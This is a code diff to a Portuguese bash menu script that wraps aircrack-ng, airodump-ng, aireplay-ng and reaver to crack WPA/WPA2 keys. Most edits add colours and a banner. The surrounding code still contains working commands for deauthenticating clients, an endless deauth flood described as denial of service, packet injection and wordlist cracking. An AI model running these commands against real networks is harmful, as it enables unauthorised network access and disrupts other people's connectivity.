@@ -2,7 +2,7 @@
 
 # Configurando variaveis do shell
 #DATA=`date +'%d-%m-%Y-%H-%M'`
-#VERSAO="v0.1"
+VERSION="v0.1"
 LICENSE="MIT Lincense"
 AUTHOR="Joao Lucas"
 #HOSTNAME=`hostname`
@@ -18,24 +18,29 @@ DIR=`pwd`
 #ARQTMP=
 ARQ=teste
 
+function cores() {
+	escape="\033";
+	branco="${escape}[0m";
+	azul="${escape}[34m";
+	vermelho="${escape}[31m";
+	verde="${escape}[32m";
+	amarelo="${escape}[33m";
+}
+
 function verificar_dependencias(){
 	if ! hash yad 2> /dev/null; then
-		echo "[ FALHA ] yad dialog nao instalado!"
+		echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} yad dialog nao instalado! ${branco}"
 		exit 1
 	fi
 
 	if ! hash aircrack-ng 2>/dev/null; then
-		echo "[ FALHA ] aircrack-ng nao instalado!"
+		
+		echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} aircrack-ng nao instalado! ${branco}"
 		exit 1
 	fi
 
-	#if ! hash xfce4-terminal 2> /dev/null; then
-	#	echo "[ FALHA ] xfce4-terminal nao instalado!"
-	#	exit 1
-	#fi
-
 	if ! hash reaver 2> /dev/null; then
-		echo "[ FALHA ] reaver nao instalado!"
+		echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} reaver nao instalado! ${branco}"
 		exit 1
 	fi
 }
@@ -44,7 +49,7 @@ function verificar_dependencias(){
 function sobre(){
 		yad --text="$TITLE \nversao $VERSION \n\n \
 	Cracking WPA/WPA2 utilizando suite aircrack-ng e yad dialog \n\n \
-	Software sob a licenca MIT License \nCodigo fonte disponivel no Github \n \
+	Software sob a licenca MIT License \n\nCodigo fonte disponivel no Github \n \
 	<https://github.com/joao-lucas/kingsizecracking> \n\n \
 	Author: $AUTHOR" \
 		--text-align=center \
@@ -61,13 +66,14 @@ function iniciar_mon() {
 # Verifica se a interface de monitoramento ja esta ativada
 iwconfig wlan0mon &> /dev/null
 if [ $? -eq 0 ]; then
-	echo -e "[ OK ] Interface de monitoramento ja estava ativa! \n"
+	echo -e "${branco}[${verde} OK ${branco}]${azul} Interface de monitoramento ativa! ${branco} \n"
 	menu
 fi
 
 # Adiciona a interface de monitoramento wlan0mon. Caso contrario, emite mensagem de erro
-iw dev wlan0 interface add wlan0mon type monitor &> /dev/null && ifconfig wlan0mon up &> /dev/null && clear && \
-echo -e "[ OK ] Modo monitoramento ativado! \n" || echo -e "[ FALHA ] Ocorreram erros em iniciar modo monitor. \n"
+iw dev wlan0 interface add wlan0mon type monitor &> /dev/null && ifconfig wlan0mon up &> /dev/null && \
+echo -e "${branco}[${verde} OK ${branco}]${azul} Monitoramento ativado! ${branco} \n" || \
+echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Ocorreram erros em iniciar o modo monitor! ${branco} \n"
 
 }
 
@@ -103,8 +109,7 @@ case "$opt" in
 	"1") varrer_todas_redes ;;
 	"2") varrer_uma_rede ;;
 	"99") menu ;;
-	"*") echo -e "[ FALHA ] Opcao invalida! \n"; menu ;;
-
+	"*") echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Opcao invalida! ${branco} \n"; menu ;;
 esac
 
 }
@@ -114,6 +119,7 @@ function deauth(){
 echo " 1. Desautenticar todos as STA de um AP"
 echo " 2. Desautenticar uma STA de um AP"
 echo " 3. Enviar infinitos pacotes de deauth, causando negacao de servicos"
+echo " 99. Voltar ao menu"
 read -p "-> " opt
 
 case "$opt" in
@@ -121,7 +127,8 @@ case "$opt" in
 	"2") deauth_cliente_especifico ;;
 	"3") deauth_brute_force ;;
 	"99") menu ;;
-	"*") echo -e "[ FALHA ] Opcao invalida! \n"; menu ;;
+	"*") echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Opcao invalida! ${branco} \n"; menu ;;
+
 esac
 
 }
@@ -130,7 +137,7 @@ function varrer_todas_redes(){
 # Escanear todas redes encontradas pelo adaptador de rede sem fio. Caso contrario, emite um erro.
 (xterm -geometry 85x25 -title "Escaneando todas as redes sem fio alcancadas pela interface de monitoramento $INTERFACE_MON" \
 -e "airodump-ng wlan0mon" &) || \
-echo -e "[ FALHA ] Ocorreram erros em escanear todas as redes, verifique a interface $INTERFACE_MON esta ativa! \n"
+echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Ocorreram erros em escanear todas as redes, verifique a interface $INTERFACE_MON esta ativa! ${azul} \n"
 
 }
 
@@ -175,7 +182,7 @@ iw dev $INTERFACE_MON set channel $CHANNEL
 # Capture no minimo 5000 (5 mil) pacotes do tipo data frame (#Data) antes de tentar realizar a quebra da senha
 (xterm -geometry 85x25 -title "Escaneando rede a sem fio $ESSID" \
 -e "airodump-ng --bssid $BSSID --channel $CHANNEL --write $DIR/$ARQ $INTERFACE_MON" &) || \
-echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID \n"
+echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Ocorreram erros em escanear a rede sem fio: $ESSID ${branco} \n"
 
 }
 
@@ -183,7 +190,7 @@ function deauth_todos_clientes() {
 # Envia 1 pacote de Desautenticação para todas as STA conectadas ao AP
 (xterm -geometry 85x25 -title "Enviando pacotes de desautenticação (Deauth) para todos as STA conectadas a rede sem fio: $ESSID" \
 -e  "aireplay-ng -0 1 -a $BSSID -e $ESSID $INTERFACE_MON --ignore-negative-one" &) || \
-echo -e "[ FALHA ] Ocorreram erros em fazer deauth dos hosts no AP: $ESSID \n"
+echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Ocorreram erros em fazer deauth dos hosts no AP: $ESSID ${branco} \n"
 
 }
 
@@ -191,7 +198,7 @@ function deauth_cliente_especifico() {
 # Envia 1 pacote de Desautenticação para uma STA conectada a um AP especifico
 (xterm -geometry 85x25 -title "Desautenticando (Deauth) a STA $CLIENT na rede $ESSID" \
 -e "aireplay-ng -0 1 -a $BSSID -c $CLIENT $INTERFACE_MON --ignore-negative-one" &) || \
-echo -e "[ FALHA ] Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID \n"
+echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID ${branco} \n"
 
 }
 
@@ -199,7 +206,7 @@ function deauth_brute_force() {
 # Envia infinitos pacotes de deauth, causando um ataque de negacao de servico
 (xterm -geometry 85x25 -title "Enviando infinitos pacotes de deauth" \
 -e "aireplay-ng -0 0 -a $BSSID -e $ESSID $INTERFACE_MON --ignore-negative-one" &) || \
-echo -e "[ FALHA ] Ocorreram erros em realizar negacao de servicos na rede sem fio: $ESSID \n"
+echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Ocorreram erros em realizar negacao de servicos na rede sem fio: $ESSID ${branco} \n"
 
 }
 
@@ -207,7 +214,7 @@ function injetar(){
 #while true; do
 # Realizar testes de injecao contra um AP
 aireplay-ng -9 -a $BSSID -a $BSSID $INTERFACE_MON --ignore-negative-one || \
-echo -e "[ FALHA ] Nao foi possivel injetar pacotes no AP: $ESSID \n"
+echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Nao foi possivel injetar pacotes no AP: $ESSID ${branco} \n"
 
 #done
 
@@ -219,7 +226,7 @@ function brute_force_psk(){
 
 # Realizar a quebra da senha, por meio de um dicionario (wordlist)
 (aircrack-ng -w $WORDLIST $OUTPUT/$ARQ) || \
-echo -e "[ FALHA ] Ocorreram erros, verifique a wordlist \n"
+echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Ocorreram erros, verifique a wordlist ${branco} \n"
 
 }
 
@@ -243,16 +250,28 @@ function alterar_mac() {
 	#MACFALSO=`ip address | awk '/ether/ {print $2}'
 }
 
+function banner(){
+
+echo -e "${vermelho}  ██ ▄█▀ ██▓ ███▄    █   ▄████      ██████  ██▓▒███████▒▓█████  "
+echo -e "${vermelho}  ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒   ▒██    ▒ ▓██▒▒ ▒ ▒ ▄▀░▓█   ▀  "
+echo -e "${vermelho} ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   ░ ▓██▄   ▒██▒░ ▒ ▄▀▒░ ▒███    "
+echo -e "${vermelho} ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓     ▒   ██▒░██░  ▄▀▒   ░▒▓█  ▄  "
+echo -e "${vermelho} ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒   ▒██████▒▒░██░▒███████▒░▒████▒ "
+echo -e "${vermelho} ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒    ▒ ▒▓▒ ▒ ░░▓  ░▒▒ ▓░▒░▒░░ ▒░ ░ "
+echo -e "${vermelho} ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░    ░ ░▒  ░ ░ ▒ ░░░▒ ▒ ░ ▒ ░ ░  ░ "
+echo -e "${vermelho} ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░    ░  ░  ░   ▒ ░░ ░ ░ ░ ░   ░    "
+echo -e "${vermelho} ░  ░    ░           ░       ░          ░   ░    ░ ░       ░  ░ "
+echo -e "${vermelho}                                  ░ ${amarelo} Author: Joao Lucas ${branco}"
+
+
+}
+
+
+
 #function ip_publico() {
 # Obtem oo endereço ip publico
 #IPPUBLICO=`curl -s ipinfo.io/ip`
 # precisa testar se o curl executou com sucesso
-#}
-
-#function infoap() {
-#Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' |$
-#Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
-#echo
 #}
 
 #function menu() {
@@ -302,15 +321,17 @@ case "$opt" in
 	"2") varrer ;;
 	"3") deauth ;;
 	"4") injetar ;;
-	"5") sobre ;;
-	"99") echo -e "[ OK ] Saindo"; matar_todos_processos; exit 0;;
-	"*") echo -e "[ FALHA ] Opcao invalida!"; sleep 2;;
+	"5") sobre ;;	
+        "99") echo -e "${branco}[${verde} OK ${branco}]${azul} Saindo do script ${branco}"; matar_todos_processos; exit 0;;
+	"*") echo -e "${branco}[${vermelho} FALHA ${branco}]${azul} Opcao invalida! ${branco} \n"; menu ;;
 
 esac
 done
 
 }
 
+cores
+banner
 verificar_dependencias
 matar_processos_que_atrapalham_suite
 conf_interface
